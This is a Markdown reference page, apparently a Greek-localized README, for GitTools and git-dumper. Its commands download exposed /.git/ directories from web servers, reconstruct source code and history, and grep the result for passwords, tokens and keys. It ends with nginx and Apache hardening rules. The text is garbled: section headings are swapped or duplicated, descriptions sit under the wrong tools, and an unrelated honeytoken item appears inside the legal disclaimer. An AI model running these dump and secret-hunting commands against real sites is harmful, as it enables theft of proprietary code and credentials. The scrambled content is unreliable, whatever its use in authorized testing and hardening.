# 📂 GitTools — Πλήρης οδηγός αναφοράς

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)



```
   ██████╗ ██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔════╝ ██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██║  ███╗██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██║   ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ╚██████╔╝██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═════╝ ╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
      Exposed /.git/ Repository Dumping, Extraction & Secret Hunting
```

<p align="center">
  <img src="https://img.shields.io/badge/GitTools-Git_Dumping-blue?style=for-the-badge" alt="GitTools">
  <img src="https://img.shields.io/badge/Author-Internetwache-orange?style=for-the-badge" alt="internetwache">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_Secrets-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-MIT-purple?style=for-the-badge" alt="MIT">
</p>

<p align="center">
  <b>📂 Essential toolkit for discovering exposed <code>/.git/</code> folders on web servers, downloading raw Git object stores, and fully reconstructing original source code and commit history</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-overview--the-exposed-git-hazard)
- [Εγκατάσταση](#-installation)
- [The Three GitTools Modules](#-the-three-gittools-modules)
  - [1. Dumper (`gitdumper.sh`)](#1-dumper-gitdumpersh)
  - [GitTools is organized into three specialized utilities:](#2-extractor-extractorsh)
  - [3. Finder (`finder.py`)](#3-finder-finderpy)
- [Alternative Python Dumper: `git-dumper`](#-alternative-python-dumper-git-dumper)
- [Post-Reconstruction Secret & Credential Hunting](#-post-reconstruction-secret--credential-hunting)
- [Γρήγορη αναφορά](#-quick-reference-table)
- [Defensive Considerations & Web Server Hardening](#-defensive-considerations--web-server-hardening)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Εισαγωγή

When developers deploy web applications via `git clone` or automated scripts without properly restricting access to hidden directories, the **`/.git/`** folder becomes accessible over HTTP/HTTPS:
`https://target.com/.git/`

Even if directory listing (indexing) is disabled, Git's deterministic structure allows an attacker to download `/.git/HEAD`, `/.git/config`, `/.git/index`, and traverse all Git loose objects (`.git/objects/xx/xxxx...`). This enables complete reconstruction of:
- 🎯 Εισαγωγή
- Database credentials, API tokens, and private SSH keys in configuration files.
- Full git commit logs, author emails, and development branches.

---

## 📥 Εγκατάσταση

```bash
# Clone GitTools repository
git clone https://github.com/internetwache/GitTools.git
cd GitTools
chmod +x Dumper/gitdumper.sh Extractor/extractor.sh

# Install alternative standalone Python git-dumper via pip
pip install git-dumper
```

---

## 🚀 The Three GitTools Modules

GitTools is organized into three specialized utilities:

### 1. Dumper (`gitdumper.sh`)
Downloads as much of the `.git` directory as possible from the web server:
```bash
# Syntax: ./gitdumper.sh <URL_TO_GIT> <LOCAL_DESTINATION>
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/target_repo/
```

### GitTools is organized into three specialized utilities:
Reconstructs original files, commit trees, and branches from the dumped `.git` loose objects:
```bash
# Syntax: ./extractor.sh <DUMPED_DIR> <OUTPUT_CODE_DIR>
./Extractor/extractor.sh /tmp/target_repo/ /tmp/extracted_source/
```
Downloads as much of the `.git` directory as possible from the web server:

### 3. Finder (`finder.py`)
2. Extractor (`extractor.sh`)
```bash
python3 Finder/finder.py -i targets.txt -u "Mozilla/5.0"
```

---

## 🐍 Alternative Python Dumper: `git-dumper`

`git-dumper` is a multi-threaded Python alternative that reconstructs a live, working git repository automatically in one step:

```bash
# Dump and reconstruct working repository in one command
git-dumper https://target.com/.git/ ./recovered_repo/

# Run through HTTP/SOCKS proxy
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./recovered_repo/
```

🐍 Alternative Python Dumper: `git-dumper`
```bash
cd ./recovered_repo/
git log -p              # Review all commit diffs and historical edits
git status              # Check untracked files
git branch -a           # List all remote and local branches
```

---

## 🔍 Post-Reconstruction Secret & Credential Hunting

Once the repository is recovered, search for credentials and hidden files:

```bash
cd ./recovered_repo/

# Search for database strings and API keys
grep -Erio "password|secret|api_key|token|AWS" .

# Scan the reconstructed repo with Gitleaks / TruffleHog
gitleaks detect -v
trufflehog git file://$(pwd)
```

---

## ⚡ Γρήγορη αναφορά

|Objective|Εντολή|
|-----------|---------|
|**Dump with git-dumper (Python)**|`git-dumper https://target.com/.git/ ./repo/`|
|**Dump with GitTools Bash**|`./Dumper/gitdumper.sh https://target.com/.git/ ./dump/`|
|**Extract Commits to Source**|`./Extractor/extractor.sh ./dump/ ./source/`|
|**Scan Host List for .git**|`python3 Finder/finder.py -i domains.txt`|
|**View Commit History**|`git log -p --color`|
|**Hunt Hardcoded Secrets**|`gitleaks detect -v`|

---

## 🛡️ Defensive Considerations & Web Server Hardening

1. **Nginx Hardening:**
   ```nginx
   location ~ /\.git {
       deny all;
       return 404;
   }
   ```
2. **Apache Hardening (`.htaccess`):**
   ```apache
   RedirectMatch 404 /\.git
   ```
3. **CI/CD Best Practices:** Never deploy code by cloning git directly into the web root (`/var/www/html/`). Use clean artifact bundles or Docker containers.

---

## ⚠️ Legal Disclaimer

3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
> GitTools and git-dumper are designed for authorized vulnerability assessments and defensive infrastructure auditing. Downloading proprietary source code from unauthorized web applications without permission is illegal.
